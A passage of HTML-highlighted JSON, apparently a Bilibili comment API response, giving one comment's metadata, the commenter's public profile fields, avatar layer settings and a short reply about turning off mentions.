class="hljs-string">&quot;共1条回复&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;sub_reply_title_text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;相关回复共1条&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;time_desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;4天前发布&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;translation_switch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;folder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;has_folded&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_folded&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;rule&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dynamic_id_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;note_cvid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;track_info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;rpid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">270933519921</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;oid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">362747247</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">11</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">122589358</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;root&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;parent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dialog&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;count&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;rcount&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;fansgrade&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;attr&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">256</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;ctime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1754905554</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;mid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;122589358&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;oid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;362747247&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;rpid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;270933519921&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;root_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;parent_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dialog_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;like&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;member&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;122589358&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;uname&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;PRTShark&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;sex&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;保密&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;sign&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;唱着自己的歌，就不会忘记初衷&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;avatar&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i1.hdslb.com/bfs/face/d361e576cfb2250c697dcef03c978df3189a5a8a.jpg&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;rank&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;10000&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;face_nft_new&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_senior_member&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;senior&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;level_info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;current_level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;current_min&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;current_exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;next_exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;pendant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;pid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;expire&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_enhance&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_enhance_frame&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;n_pid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;nameplate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;nid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;见习偶像&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i2.hdslb.com/bfs/face/e93dd9edfa7b9e18bf46fd8d71862327a2350923.png&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_small&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i1.hdslb.com/bfs/face/275b468b043ec246737ab8580a2075bee0b1263b.png&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;普通勋章&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;所有自制视频总播放数&gt;=10万&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;official_verify&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;vip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;vipType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipDueDate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1673539200000</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;dueRemark&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;accessStatus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipStatus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipStatusWarn&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;themeType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;label_theme&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;text_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;bg_style&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;bg_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;border_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;use_img_label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hans&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hans_static&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/vip/d7b702ef65a976b20ed854cbd04cb9e27341bb79.png&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hant_static&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/activity-plat/static/20220614/e369244d0b14644f5e1a06431e22a4d5/KJunwh19T5.png&quot;</span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;avatar_subscript&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;nickname_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;fans_detail&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;user_sailing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;pendant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;cardbg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;cardbg_with_focus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;user_sailing_v2&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_contractor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;contract_desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;nft_interaction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;avatar_item&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;container_size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1.8</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1.8</span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;fallback_layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                                <span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;visible&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;general_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;pos_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;coordinate_pos&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;axis_x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;axis_y&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;size_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;render_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;opacity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;layer_config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;tags&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;AVATAR_LAYER&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;is_critical&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;layer_mask&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;general_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;pos_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;coordinate_pos&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;axis_x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;axis_y&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><br>                                                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;size_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;render_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;opacity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;mask_src&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;src_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;draw&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;draw_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;fill_mode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;color_config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                        <span class="hljs-attr">&quot;day&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                            <span class="hljs-attr">&quot;argb&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#FF000000&quot;</span><br>                                                        <span class="hljs-punctuation">&#125;</span><br>                                                    <span class="hljs-punctuation">&#125;</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;res_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;res_image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;image_src&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;src_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;placeholder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;remote&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i1.hdslb.com/bfs/face/d361e576cfb2250c697dcef03c978df3189a5a8a.jpg&quot;</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;bfs_style&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;widget-layer-avatar&quot;</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><br>                                <span class="hljs-punctuation">&#125;</span><br>                            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;is_critical_group&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;122589358&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;没事了，我把”@“给关了&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;members&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;jump_url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;max_line&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;replies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;assist&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;up_action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;like&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;reply&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;invisible&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;card_label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;rpid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">270933519921</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;text_content&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UP主觉得很赞&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;text_color_day&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#757575&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;text_color_night&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#939393&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;label_color_day&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#F4F4F4&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;label_color_night&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#1E1E1E&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;background&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;background_width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;background_height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;jump_url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;effect_start_time&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><span 